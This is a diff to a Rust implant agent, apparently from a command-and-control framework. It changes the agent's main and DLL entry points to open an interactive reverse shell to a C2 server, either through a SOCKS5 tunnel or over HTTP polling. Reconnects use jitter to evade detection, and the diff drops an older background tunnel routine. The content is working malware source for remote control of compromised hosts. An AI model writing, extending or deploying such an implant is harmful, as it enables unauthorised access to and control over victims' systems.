@@ -7,58 +7,15 @@ mod commands;
 mod config;
 mod networking;
 
-use commands::command_shell::run_shell;
+use commands::command_shell::{run_shell, run_shell_over_socks};
 use config::AgentConfig;
-use networking::socks5::Socks5Client;
+use tokio_socks::tcp::Socks5Stream;
 use std::env;
 use std::time::Duration;
+use std::net::SocketAddr;
 
 #[cfg(feature = "dll")]
 use std::os::raw::c_int;
-
-// Start SOCKS5 reverse tunnel in the background
-async fn start_reverse_tunnel(config: AgentConfig) {
-    if !config.socks5_enabled {
-        return;
-    }
-
-    // Extract host and port from server URL
-    let server_url = config.get_server_url();
-    let url_parts: Vec<&str> = server_url.split("://").nth(1)
-        .unwrap_or_default()
-        .split(':')
-        .collect();
-    
-    if url_parts.len() != 2 {
-        println!("[ERROR] Invalid server URL format for SOCKS5 tunnel");
-        return;
-    }
-
-    let proxy_host = url_parts[0].to_string();
-    let proxy_port = url_parts[1].parse::<u16>().unwrap_or(1080);
-    let socks_port = config.socks5_port;
-
-    println!("[SOCKS5] Starting reverse tunnel to {}:{} on local port {}", 
-        proxy_host, proxy_port, socks_port);
-
-    let client = Socks5Client::new(proxy_host.clone(), proxy_port)
-        .with_timeout(Duration::from_secs(30));
-    
-    // Start tunnel in background task
-    tokio::spawn(async move {
-        loop {
-            match client.start_reverse_tunnel(socks_port).await {
-                Ok(_) => {
-                    println!("[SOCKS5] Tunnel closed, restarting...");
-                }
-                Err(e) => {
-                    println!("[ERROR] Reverse tunnel failed: {}. Retrying...", e);
-                    tokio::time::sleep(Duration::from_secs(5)).await;
-                }
-            }
-        }
-    });
-}
 
 // Main entry point for standalone executable
 #[tokio::main]
@@ -74,22 +31,41 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Use payload ID from config as agent ID
     let agent_id = config.payload_id.clone();
     println!("[INFO] Agent ID: {}", agent_id);
-    
-    // Start SOCKS5 tunnel if enabled
-    start_reverse_tunnel(config.clone()).await;
-    
-    println!("[NETWORK] Attempting connection to C2: {}", server_addr);
-    
-    loop {
-        match run_shell(&server_addr, &agent_id).await {
-            Ok(_) => println!("[INFO] Shell session ended"),
-            Err(e) => println!("[ERROR] Shell error: {}. Retrying...", e),
+
+    // Choose communication protocol
+    if config.protocol == "socks5" && config.socks5_enabled {
+        // SOCKS5 reverse shell loop
+        loop {
+            println!("[NETWORK] Establishing SOCKS5 tunnel to C2 via 127.0.0.1:{}...", config.socks5_port);
+            let proxy_addr: SocketAddr = format!("127.0.0.1:{}", config.socks5_port).parse()?;
+            let stream = Socks5Stream::connect(proxy_addr, server_addr.clone())
+                .await?
+                .into_inner();
+            println!("[SOCKS5] Tunnel to C2 ({}) established", server_addr);
+            // Run interactive shell over the SOCKS5 tunnel
+            if let Err(e) = run_shell_over_socks(stream, &agent_id).await {
+                println!("[ERROR] Shell error: {}. Retrying...", e);
+            } else {
+                println!("[INFO] Shell session ended");
+            }
+            // Jittered reconnect
+            let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
+            tokio::time::sleep(Duration::from_secs(sleep_time)).await;
+            println!("[RETRY] Attempting to reconnect tunnel...");
         }
-        
-        // Add jitter to reconnection attempts
-        let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
-        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
-        println!("[RETRY] Attempting to reconnect...");
+    } else {
+        // HTTP-polling shell loop
+        loop {
+            println!("[NETWORK] Attempting connection to C2: {}", server_addr);
+            if let Err(e) = run_shell(&server_addr, &agent_id).await {
+                println!("[ERROR] Shell error: {}. Retrying...", e);
+            } else {
+                println!("[INFO] Shell session ended");
+            }
+            let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
+            tokio::time::sleep(Duration::from_secs(sleep_time)).await;
+            println!("[RETRY] Attempting to reconnect...");
+        }
     }
 }
 
@@ -108,22 +84,27 @@ async fn run_agent() -> Result<(), Box<dyn std::error::Error>> {
     let agent_id = config.payload_id.clone();
     println!("[INFO] Agent ID: {}", agent_id);
     
-    // Start SOCKS5 tunnel if enabled
-    start_reverse_tunnel(config.clone()).await;
-    
+    // Shared DLL entrypoint uses same logic
     let server_addr = config.get_server_url();
-    println!("[NETWORK] Attempting connection to C2: {}", server_addr);
-    
     loop {
-        match run_shell(&server_addr, &agent_id).await {
-            Ok(_) => println!("[INFO] Shell session ended"),
+        println!("[NETWORK] Establishing SOCKS5 tunnel to C2 via 127.0.0.1:1080...");
+        let proxy_addr: SocketAddr = "127.0.0.1:1080".parse()?;
+        let target = format!("{}", server_addr);
+        let stream = Socks5Stream::connect(proxy_addr, target)
+            .await?
+            .into_inner();
+        println!("[SOCKS5] Tunnel to C2 ({}) established", server_addr);
+
+        // Run interactive shell over the SOCKS5 tunnel
+        match run_shell_over_socks(stream, &agent_id).await {
+            Ok(()) => println!("[INFO] Shell session ended"),
             Err(e) => println!("[ERROR] Shell error: {}. Retrying...", e),
         }
-        
-        // Add jitter to reconnection attempts
+
+        // Jittered reconnect
         let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
-        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
-        println!("[RETRY] Attempting to reconnect...");
+        tokio::time::sleep(Duration::from_secs(sleep_time)).await;
+        println!("[RETRY] Attempting to reconnect tunnel...");
     }
 }
 
